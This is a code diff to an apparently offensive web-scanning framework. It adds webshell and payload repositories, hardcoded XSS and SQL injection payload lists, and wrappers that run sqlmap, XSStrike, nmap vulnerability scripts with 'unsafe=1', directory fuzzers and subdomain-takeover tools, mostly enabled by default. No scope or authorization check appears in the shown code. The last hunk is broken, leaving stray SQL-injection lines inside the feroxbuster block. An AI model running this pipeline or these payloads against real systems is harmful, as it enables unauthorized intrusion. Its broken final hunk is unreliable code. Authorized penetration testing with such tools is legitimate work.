@@ -50,7 +50,17 @@ DEFAULT_CFG: Dict[str, Any] = {
         "NucleiTemplates": "https://github.com/projectdiscovery/nuclei-templates.git",
         "Wordlists": "https://github.com/berzerk0/Probable-Wordlists.git",
         "FuzzDB": "https://github.com/fuzzdb-project/fuzzdb.git",
-        "WebShells": "https://github.com/tennc/webshell.git"
+        "WebShells": "https://github.com/tennc/webshell.git",
+        # Enhanced Community Nuclei Templates
+        "NucleiCommunity": "https://github.com/geeknik/the-nuclei-templates.git",
+        "NucleiFuzzing": "https://github.com/projectdiscovery/fuzzing-templates.git",
+        "CustomNuclei": "https://github.com/panch0r3d/nuclei-templates.git",
+        "KnightSec": "https://github.com/knightsec/nuclei-templates-ksec.git",
+        "AdditionalWordlists": "https://github.com/assetnote/commonspeak2-wordlists.git",
+        "OneListForAll": "https://github.com/six2dez/OneListForAll.git",
+        "WebDiscoveryWordlists": "https://github.com/Bo0oM/fuzz.txt.git",
+        "XSSPayloads": "https://github.com/payloadbox/xss-payload-list.git",
+        "SQLIPayloads": "https://github.com/payloadbox/sql-injection-payload-list.git"
     },
     "limits": {
         "parallel_jobs": 20,
@@ -69,7 +79,19 @@ DEFAULT_CFG: Dict[str, Any] = {
         "all_templates": True,
         "keep_info_severity": False,
         "custom_templates": True,
-        "disable_cluster_bomb": False
+        "disable_cluster_bomb": False,
+        "community_templates": True,
+        "template_sources": [
+            "~/nuclei-templates",
+            "~/nuclei-community",
+            "~/nuclei-fuzzing",
+            "~/custom-nuclei",
+            "~/nuclei-ksec"
+        ],
+        "update_templates": True,
+        "template_categories": "all",
+        "exclude_templates": [],
+        "custom_payloads": True
     },
     "endpoints": {
         "use_gau": True,
@@ -101,8 +123,63 @@ DEFAULT_CFG: Dict[str, Any] = {
         "enable_dirb": True,
         "enable_gobuster": True,
         "enable_ffuf": True,
+        "enable_feroxbuster": True,
         "wordlist_size": "medium",
-        "extensions": "php,asp,aspx,jsp,html,htm,txt,bak,old,conf"
+        "extensions": "php,asp,aspx,jsp,html,htm,txt,bak,old,conf,json,xml,yaml,yml,config",
+        "advanced_fuzzing": True,
+        "recursive_fuzzing": True,
+        "status_codes": "200,201,202,204,301,302,303,307,308,401,403,405,500",
+        "threads": 50,
+        "wordlist_sources": ["seclists", "common", "big", "directory-list", "custom"],
+        "parameter_fuzzing": True,
+        "subdomain_fuzzing": True
+    },
+    "xss_testing": {
+        "enabled": True,
+        "xss_strike": True,
+        "custom_payloads": True,
+        "reflected_xss": True,
+        "stored_xss": True,
+        "dom_xss": True,
+        "blind_xss": True,
+        "payload_encoding": True,
+        "bypass_filters": True
+    },
+    "subdomain_takeover": {
+        "enabled": True,
+        "subjack": True,
+        "subzy": True,
+        "nuclei_takeover": True,
+        "custom_signatures": True,
+        "timeout": 30,
+        "threads": 10
+    },
+    "nmap_scanning": {
+        "enabled": True,
+        "quick_scan": True,
+        "full_scan": False,
+        "stealth_scan": True,
+        "service_detection": True,
+        "os_detection": True,
+        "script_scanning": True,
+        "vulnerability_scripts": True,
+        "top_ports": 1000,
+        "timing": 4,
+        "custom_scripts": []
+    },
+    "sqlmap_testing": {
+        "enabled": True,
+        "crawl_depth": 2,
+        "level": 3,
+        "risk": 2,
+        "techniques": "BEUST",
+        "threads": 5,
+        "batch_mode": True,
+        "tamper_scripts": [],
+        "custom_payloads": True,
+        "time_based": True,
+        "error_based": True,
+        "union_based": True
     },
     "report": {
         "formats": ["html", "json", "csv", "sarif"],
@@ -438,19 +515,27 @@ def validate_dependencies() -> bool:
         "gobuster": "go install github.com/OJ/gobuster/v3@latest",
         "dirb": "apt install dirb", 
         "ffuf": "go install github.com/ffuf/ffuf/v2@latest",
+        "feroxbuster": "go install github.com/epi052/feroxbuster@latest",
         "waybackurls": "go install github.com/tomnomnom/waybackurls@latest",
         "gospider": "go install github.com/jaeles-project/gospider@latest",
         "subjack": "go install github.com/haccer/subjack@latest",
+        "subzy": "go install github.com/LukaSikic/subzy@latest",
         "whatweb": "apt install whatweb",
         "wappalyzer": "npm install -g wappalyzer",
         "nikto": "apt install nikto",
         "sqlmap": "apt install sqlmap",
-        "commix": "apt install commix"
+        "commix": "apt install commix",
+        "xssstrike": "pip3 install xssstrike",
+        "nmap": "apt install nmap",
+        "dirsearch": "pip3 install dirsearch",
+        "paramspider": "go install github.com/devanshbatham/paramspider@latest",
+        "arjun": "pip3 install arjun",
+        "dalfox": "go install github.com/hahwul/dalfox/v2@latest"
     }
     
     available_tools = []
     missing_tools = []
-    core_tools = ["subfinder", "httpx", "naabu", "nuclei", "katana", "gau"]
+    core_tools = ["subfinder", "httpx", "naabu", "nuclei", "katana", "gau", "ffuf", "nmap", "sqlmap"]
     
     for tool, install_cmd in tools.items():
         if which(tool):
@@ -608,8 +693,18 @@ def refresh_external_sources(cfg: Dict[str, Any]) -> Dict[str, Path]:
         "PayloadsAllTheThings": EXT_DIR / "PayloadsAllTheThings",
         "Exploits": EXPLOITS_DIR / "exploitdb",
         "NucleiTemplates": Path.home() / "nuclei-templates",
+        "NucleiCommunity": Path.home() / "nuclei-community",
+        "NucleiFuzzing": Path.home() / "nuclei-fuzzing", 
+        "CustomNuclei": Path.home() / "custom-nuclei",
+        "KnightSec": Path.home() / "nuclei-ksec",
         "Wordlists": EXT_DIR / "Probable-Wordlists",
+        "AdditionalWordlists": EXT_DIR / "commonspeak2-wordlists",
+        "OneListForAll": EXT_DIR / "OneListForAll",
+        "WebDiscoveryWordlists": EXT_DIR / "fuzz.txt",
+        "XSSPayloads": PAYLOADS_DIR / "xss-payload-list",
+        "SQLIPayloads": PAYLOADS_DIR / "sql-injection-payload-list"
     }
+    
     for name, path in sources.items():
         url = cfg["repos"].get(name)
         if not url:
@@ -618,9 +713,158 @@ def refresh_external_sources(cfg: Dict[str, Any]) -> Dict[str, Path]:
         if not path.exists() and cfg["fallback"]["enabled"] and cfg["fallback"]["direct_downloads"]:
             logger.log(f"Trying direct download fallback for {name}", "WARNING")
             direct_zip_download(url, path)
+            
+    # Special handling for nuclei templates
+    if which("nuclei"):
+        try:
+            logger.log("Updating nuclei templates cache", "INFO")
+            run_cmd(["nuclei", "-update-templates"], check_return=False, timeout=300)
+        except Exception as e:
+            logger.log(f"Failed to update nuclei templates: {e}", "WARNING")
+    
     return sources
 
-def merge_wordlists(seclists_path: Path, payloads_path: Path, probable_wordlists_path: Path):
+def get_best_wordlist(category: str) -> Optional[Path]:
+    """Get the best available wordlist for a given category"""
+    wordlist_mapping = {
+        "directories": [
+            MERGED_DIR / "directories_merged.txt",
+            EXT_DIR / "SecLists" / "Discovery" / "Web-Content" / "directory-list-2.3-medium.txt",
+            EXT_DIR / "SecLists" / "Discovery" / "Web-Content" / "common.txt",
+            EXT_DIR / "OneListForAll" / "onelistforall.txt",
+            EXTRA_DIR / "paths_extra.txt"
+        ],
+        "files": [
+            MERGED_DIR / "files_merged.txt", 
+            EXT_DIR / "SecLists" / "Discovery" / "Web-Content" / "raft-medium-files.txt",
+            EXT_DIR / "SecLists" / "Discovery" / "Web-Content" / "common.txt",
+            EXT_DIR / "fuzz.txt" / "fuzz.txt"
+        ],
+        "parameters": [
+            MERGED_DIR / "params_merged.txt",
+            EXT_DIR / "SecLists" / "Discovery" / "Web-Content" / "burp-parameter-names.txt",
+            EXTRA_DIR / "params_extra.txt"
+        ],
+        "subdomains": [
+            MERGED_DIR / "subdomains_merged.txt",
+            EXT_DIR / "SecLists" / "Discovery" / "DNS" / "subdomains-top1million-110000.txt",
+            EXT_DIR / "commonspeak2-wordlists" / "subdomains" / "subdomains.txt"
+        ],
+        "xss": [
+            PAYLOADS_DIR / "xss-payload-list" / "Intruder" / "xss-payload-list.txt",
+            EXT_DIR / "PayloadsAllTheThings" / "XSS Injection" / "README.md",
+            EXTRA_DIR / "exploit_payloads.txt"
+        ],
+        "sqli": [
+            PAYLOADS_DIR / "sql-injection-payload-list" / "sqli-blind.txt",
+            EXT_DIR / "PayloadsAllTheThings" / "SQL Injection" / "README.md",
+            EXT_DIR / "SecLists" / "Fuzzing" / "SQLi" / "quick-SQLi.txt"
+        ]
+    }
+    
+    wordlists = wordlist_mapping.get(category, [])
+    
+    for wordlist in wordlists:
+        if wordlist.exists() and wordlist.stat().st_size > 0:
+            return wordlist
+    
+    logger.log(f"No wordlist found for category: {category}", "WARNING") 
+    return None
+
+def create_enhanced_payloads():
+    """Create enhanced payload collections for various attack types"""
+    PAYLOADS_DIR.mkdir(exist_ok=True)
+    
+    # XSS payloads
+    xss_payloads_dir = PAYLOADS_DIR / "xss"
+    xss_payloads_dir.mkdir(exist_ok=True)
+    
+    xss_payloads = [
+        "<script>alert('XSS')</script>",
+        "javascript:alert('XSS')",
+        "<img src=x onerror=alert('XSS')>",
+        "<svg onload=alert('XSS')>",
+        "';alert('XSS');//",
+        "\"><script>alert('XSS')</script>",
+        "<iframe src=javascript:alert('XSS')>",
+        "<body onload=alert('XSS')>",
+        "<input onfocus=alert('XSS') autofocus>",
+        "<select onfocus=alert('XSS') autofocus>",
+        "<textarea onfocus=alert('XSS') autofocus>",
+        "<details open ontoggle=alert('XSS')>",
+        "<marquee onstart=alert('XSS')>",
+        "'><svg/onload=alert('XSS')>",
+        "\"><img/src/onerror=alert('XSS')>",
+        "<script>alert(String.fromCharCode(88,83,83))</script>"
+    ]
+    
+    with open(xss_payloads_dir / "basic_xss.txt", 'w') as f:
+        f.write('\n'.join(xss_payloads))
+    
+    # SQLi payloads
+    sqli_payloads_dir = PAYLOADS_DIR / "sqli"
+    sqli_payloads_dir.mkdir(exist_ok=True)
+    
+    sqli_payloads = [
+        "' OR '1'='1",
+        "' OR 1=1--",
+        "' OR '1'='1'/*",
+        "admin'--",
+        "admin'/*",
+        "' OR 1=1#",
+        "' OR 1=1/*",
+        "') OR ('1'='1",
+        "') OR ('1'='1'--",
+        "') OR ('1'='1'/*",
+        "1' OR '1'='1",
+        "1' OR '1'='1'--",
+        "1' OR '1'='1'/*",
+        "1 OR 1=1",
+        "1 OR 1=1--",
+        "1 OR 1=1/*",
+        "' UNION SELECT NULL--",
+        "' UNION SELECT NULL,NULL--",
+        "' UNION SELECT NULL,NULL,NULL--",
+        "'; WAITFOR DELAY '00:00:10'--"
+    ]
+    
+    with open(sqli_payloads_dir / "basic_sqli.txt", 'w') as f:
+        f.write('\n'.join(sqli_payloads))
+    
+    # Nuclei custom payloads
+    nuclei_payloads_dir = PAYLOADS_DIR / "nuclei"
+    nuclei_payloads_dir.mkdir(exist_ok=True)
+    
+    # Create custom nuclei template for enhanced testing
+    custom_template = """id: enhanced-security-checks
+    
+info:
+  name: Enhanced Security Checks
+  author: bl4ckc3ll-pantheon
+  severity: info
+  
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      - "{{BaseURL}}/.git/config"
+      - "{{BaseURL}}/admin"
+      - "{{BaseURL}}/administrator"
+      - "{{BaseURL}}/wp-admin"
+      - "{{BaseURL}}/phpmyadmin"
+      
+    matchers:
+      - type: word
+        words:
+          - "git"
+          - "admin"
+          - "phpMyAdmin"
+"""
+    
+    with open(nuclei_payloads_dir / "custom-template.yaml", 'w') as f:
+        f.write(custom_template)
+
+def merge_wordlists(seclists_path: Path, payloads_path: Path, probable_wordlists_path: Path, additional_paths: Dict[str, Path] = None):
     logger.log("Merging wordlists...", "INFO")
     MERGED_DIR.mkdir(parents=True, exist_ok=True)
     all_files: List[Path] = []
@@ -783,38 +1027,192 @@ def run_subjack(subdomains_file: Path, out_file: Path, env: Dict[str, str]):
         "-c", "/opt/subjack/fingerprints.json", "-v"
     ], env=env, timeout=600, check_return=False)
 
-def run_sqlmap(target: str, out_file: Path, env: Dict[str, str]):
+def run_sqlmap(target: str, out_file: Path, env: Dict[str, str], cfg: Dict[str, Any]):
     if not which("sqlmap"):
         logger.log("sqlmap not found, skipping", "WARNING")
         return
-    run_cmd([
-        "sqlmap", "-u", target, "--batch", "--crawl", "2",
-        "--level", "3", "--risk", "2", "--output-dir", str(out_file.parent),
-        "--technique", "BEUST", "--threads", "5"
-    ], env=env, timeout=1800, check_return=False)
+    
+    # Get configuration
+    sqlmap_cfg = cfg.get("sqlmap_testing", {})
+    
+    cmd = [
+        "sqlmap", "-u", target, "--batch", 
+        "--crawl", str(sqlmap_cfg.get("crawl_depth", 2)),
+        "--level", str(sqlmap_cfg.get("level", 3)),
+        "--risk", str(sqlmap_cfg.get("risk", 2)), 
+        "--output-dir", str(out_file.parent),
+        "--technique", sqlmap_cfg.get("techniques", "BEUST"),
+        "--threads", str(sqlmap_cfg.get("threads", 5))
+    ]
+    
+    # Add tamper scripts if configured
+    tamper_scripts = sqlmap_cfg.get("tamper_scripts", [])
+    if tamper_scripts:
+        cmd.extend(["--tamper", ",".join(tamper_scripts)])
+    
+    run_cmd(cmd, env=env, timeout=1800, check_return=False)
+
+def run_xss_strike(target: str, out_file: Path, env: Dict[str, str], cfg: Dict[str, Any]):
+    """Run XSStrike for XSS vulnerability testing"""
+    if not which("xsstrike"):
+        logger.log("XSStrike not found, skipping", "WARNING")
+        return
+    
+    xss_cfg = cfg.get("xss_testing", {})
+    
+    cmd = ["xsstrike", "-u", target]
+    
+    if xss_cfg.get("reflected_xss", True):
+        cmd.append("--fuzzer")
+    
+    if xss_cfg.get("crawl", True):
+        cmd.extend(["--crawl", "--level", "2"])
+    
+    # Output to file
+    result_file = out_file.parent / f"xsstrike_{target.replace('/', '_').replace(':', '_')}.json"
+    cmd.extend(["-o", str(result_file)])
+    
+    run_cmd(cmd, env=env, timeout=1200, check_return=False)
+
+def run_subzy(targets_file: Path, out_file: Path, env: Dict[str, str], cfg: Dict[str, Any]):
+    """Run Subzy for subdomain takeover detection"""
+    if not which("subzy"):
+        logger.log("subzy not found, skipping", "WARNING")
+        return
+    
+    takeover_cfg = cfg.get("subdomain_takeover", {})
+    
+    cmd = [
+        "subzy", "run",
+        "--targets", str(targets_file),
+        "--concurrency", str(takeover_cfg.get("threads", 10)),
+        "--timeout", str(takeover_cfg.get("timeout", 30)),
+        "--verify_ssl"
+    ]
+    
+    # Run and capture output
+    try:
+        result = run_cmd(cmd, env=env, timeout=600, capture=True, check_return=False)
+        if result.stdout:
+            with open(out_file, 'w') as f:
+                f.write(result.stdout)
+    except Exception as e:
+        logger.log(f"Subzy execution error: {e}", "ERROR")
+
+def run_enhanced_nmap(target: str, out_file: Path, env: Dict[str, str], cfg: Dict[str, Any]):
+    """Run enhanced Nmap scanning with advanced options"""
+    if not which("nmap"):
+        logger.log("nmap not found, skipping", "WARNING")
+        return
+        
+    nmap_cfg = cfg.get("nmap_scanning", {})
+    hostname = target.replace("http://", "").replace("https://", "").split("/")[0]
+    
+    # Basic service detection
+    if nmap_cfg.get("service_detection", True):
+        cmd = [
+            "nmap", "-sS", "-sV", 
+            "--top-ports", str(nmap_cfg.get("top_ports", 1000)),
+            "-T" + str(nmap_cfg.get("timing", 4)),
+            "-oA", str(out_file.parent / f"nmap_{hostname}"),
+            hostname
+        ]
+        
+        if nmap_cfg.get("os_detection", True):
+            cmd.insert(-1, "-O")
+            
+        if nmap_cfg.get("script_scanning", True):
+            cmd.insert(-1, "-sC")
+            
+        run_cmd(cmd, env=env, timeout=1800, check_return=False)
+    
+    # Vulnerability scripts
+    if nmap_cfg.get("vulnerability_scripts", True):
+        vuln_cmd = [
+            "nmap", "--script", "vuln",
+            "--script-args", "unsafe=1",
+            "-oA", str(out_file.parent / f"nmap_vuln_{hostname}"),
+            hostname
+        ]
+        run_cmd(vuln_cmd, env=env, timeout=2400, check_return=False)
+
+def run_feroxbuster(target: str, wordlist: Path, out_file: Path, env: Dict[str, str], cfg: Dict[str, Any]):
+    """Run feroxbuster for directory discovery"""
+    if not which("feroxbuster"):
+        logger.log("feroxbuster not found, skipping", "WARNING")
+        return
+    if not wordlist.exists():
+        logger.log(f"Wordlist not found: {wordlist}", "WARNING")
+        return
+        
+    fuzzing_cfg = cfg.get("fuzzing", {})
+    
+    cmd = [
+        "feroxbuster", 
+        "-u", target,
+        "-w", str(wordlist),
+        "-o", str(out_file),
+        "-t", str(fuzzing_cfg.get("threads", 50)),
+        "-s", fuzzing_cfg.get("status_codes", "200,204,301,302,307,308,401,403,405,500"),
+        "--auto-tune"
+    ]
+    
+    # Add extensions if configured
+    extensions = fuzzing_cfg.get("extensions", "")
+    if extensions:
+        cmd.extend(["-x", extensions])
+    
+    # Recursive scanning if enabled
+    if fuzzing_cfg.get("recursive_fuzzing", True):
+        cmd.extend(["-r", "-d", "3"])
+    
+    run_cmd(cmd, env=env, timeout=1800, check_return=False)
 
 def run_nuclei_single_target(target: str, out_file: Path, cfg: Dict[str, Any], env: Dict[str, str]):
     if not which("nuclei") or not cfg["nuclei"]["enabled"]:
         logger.log("nuclei not found or disabled, skipping", "WARNING")
         return
+        
+    nuclei_cfg = cfg["nuclei"]
+    
     cmd = [
         "nuclei", "-u", target, "-json", "-o", str(out_file),
-        "-severity", cfg["nuclei"]["severity"],
-        "-rl", str(cfg["nuclei"]["rps"]),
-        "-c", str(cfg["nuclei"]["conc"]),
+        "-severity", nuclei_cfg["severity"],
+        "-rl", str(nuclei_cfg["rps"]),
+        "-c", str(nuclei_cfg["conc"]),
         "-silent", "-no-color"
     ]
-    if cfg["nuclei"]["all_templates"]:
+    
+    # Add community template sources
+    if nuclei_cfg.get("community_templates", True):
+        template_sources = nuclei_cfg.get("template_sources", [])
+        for template_source in template_sources:
+            template_path = Path(template_source).expanduser()
+            if template_path.exists():
+                cmd.extend(["-t", str(template_path)])
+    
+    if nuclei_cfg["all_templates"]:
         # default template path commonly at ~/nuclei-templates
         tpl = str(Path.home() / "nuclei-templates")
         if Path(tpl).exists():
             cmd.extend(["-t", tpl])
     
     # Add custom templates if enabled
-    if cfg["nuclei"].get("custom_templates", False):
+    if nuclei_cfg.get("custom_templates", False):
         custom_templates = PLUGINS_DIR / "nuclei_templates"
         if custom_templates.exists():
             cmd.extend(["-t", str(custom_templates)])
+    
+    # Custom template categories
+    template_categories = nuclei_cfg.get("template_categories", "all")
+    if template_categories != "all":
+        cmd.extend(["-tags", template_categories])
+    
+    # Exclude templates if configured
+    exclude_templates = nuclei_cfg.get("exclude_templates", [])
+    if exclude_templates:
+        for exclude in exclude_templates:
+            cmd.extend(["-exclude-tags", exclude])
     
     run_cmd(cmd, env=env, timeout=3600, check_return=False)
 
@@ -1599,6 +1997,25 @@ def stage_recon(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
 
             results["status"] = "completed"
             logger.log(f"Recon completed for {target}", "SUCCESS")
+            # Phase 7: Subdomain Takeover Detection
+            if cfg.get("subdomain_takeover", {}).get("enabled", True) and results["subdomains"]:
+                logger.log(f"Phase 7: Subdomain takeover detection for {host}", "INFO")
+                
+                # Create subdomain file for takeover tools
+                subs_file = tdir / "subdomains.txt"
+                
+                # Run subjack
+                if cfg.get("subdomain_takeover", {}).get("subjack", True) and which("subjack"):
+                    subjack_out = tdir / "subjack_results.txt"
+                    run_cmd([
+                        "subjack", "-w", str(subs_file), "-t", "100", "-timeout", "30", 
+                        "-o", str(subjack_out), "-ssl"
+                    ], env=env, timeout=600, check_return=False)
+                
+                # Run subzy  
+                if cfg.get("subdomain_takeover", {}).get("subzy", True):
+                    subzy_out = tdir / "subzy_results.json"
+                    run_subzy(subs_file, subzy_out, env, cfg)
             
         except Exception as e:
             logger.log(f"Recon error {target}: {e}", "ERROR")
@@ -1689,7 +2106,37 @@ def stage_vuln_scan(run_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]):
                 run_compliance_checks(target_url, compliance_out, cfg, env)
             
             # Phase 12: SQL Injection Testing (if enabled)
-            if which("sqlmap") and cfg.get("advanced_scanning", {}).get("sql_injection", False):
+            if cfg.get("sqlmap_testing", {}).get("enabled", True):
+                logger.log(f"Phase 12: SQL injection testing for {target}", "INFO")
+                sqlmap_out = tdir / "sqlmap_results"
+                run_sqlmap(target_url, sqlmap_out, env, cfg)
+            
+            # Phase 13: XSS Testing with XSStrike
+            if cfg.get("xss_testing", {}).get("enabled", True):
+                logger.log(f"Phase 13: XSS testing for {target}", "INFO")
+                xss_out = tdir / "xss_results.json"
+                run_xss_strike(target_url, xss_out, env, cfg)
+            
+            # Phase 14: Enhanced Nmap Vulnerability Scanning
+            if cfg.get("nmap_scanning", {}).get("enabled", True):
+                logger.log(f"Phase 14: Enhanced Nmap scanning for {target}", "INFO")
+                nmap_out = tdir / "nmap_results"
+                run_enhanced_nmap(target_url, nmap_out, env, cfg)
+            
+            # Phase 15: Directory and File Fuzzing with Multiple Tools
+            if cfg.get("fuzzing", {}).get("enable_ffuf", True):
+                logger.log(f"Phase 15a: FFUF directory fuzzing for {target}", "INFO")
+                wordlist = get_best_wordlist("directories")
+                if wordlist:
+                    ffuf_out = tdir / "ffuf_results.json"
+                    run_ffuf(target_url, wordlist, ffuf_out, env)
+            
+            if cfg.get("fuzzing", {}).get("enable_feroxbuster", True):
+                logger.log(f"Phase 15b: Feroxbuster directory fuzzing for {target}", "INFO")
+                wordlist = get_best_wordlist("directories")
+                if wordlist:
+                    ferox_out = tdir / "feroxbuster_results.json"
+                    run_feroxbuster(target_url, wordlist, ferox_out, env, cfg)
                 logger.log(f"Phase 12: SQL injection testing for {target}", "INFO")
                 sqlmap_out = tdir / "sqlmap_results"
                 sqlmap_out.mkdir(exist_ok=True)
